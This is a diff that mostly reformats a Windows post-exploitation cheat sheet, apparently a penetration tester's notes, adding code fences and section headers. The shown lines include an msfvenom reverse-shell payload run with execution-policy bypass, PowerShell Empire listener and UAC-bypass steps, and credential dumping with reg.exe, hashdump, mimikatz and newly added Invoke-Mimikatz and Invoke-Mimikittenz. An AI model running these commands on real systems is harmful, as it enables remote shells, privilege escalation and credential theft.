@@ -487,10 +487,10 @@ seatbelt.exe all > seatbelt-report
 ***If Windows 7 and above***
 msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f psh -o shell_80.ps1
 powershell -ExecutionPolicy Bypass -NoExit -File shell_80.ps1
+```
 
-OR
-
-Empire:
+### Empire
+```
 powershell-empire
 listeners
 uselistener http
@@ -539,15 +539,18 @@ bypassuac INSERTIPADDRESS
 usemodule privesc/bypassuac_wscript
 set Listener INSERTIPADDRESS
 execute
+```
 
+### Other Options
+```
 Exploit Suggester:
 https://github.com/bitsadmin/wesng
 
 Mimikittenz
 For userland creds in memory
 https://github.com/putterpanda/mimikittenz
-
 ```
+
 ### Basic info
 
 **Users:**
@@ -654,8 +657,9 @@ netstat -ano
 ```
 
 ### Programs running as root/system
+```
 
-
+```
 
 ### Installed software
 
@@ -770,6 +774,8 @@ reg.exe save hklm\system c:\system
 hashdump
 load mimikatz
 msv
+Invoke-Mimikatz
+Invoke-Mimikittenz
 ```
 
 ### Dualhomed
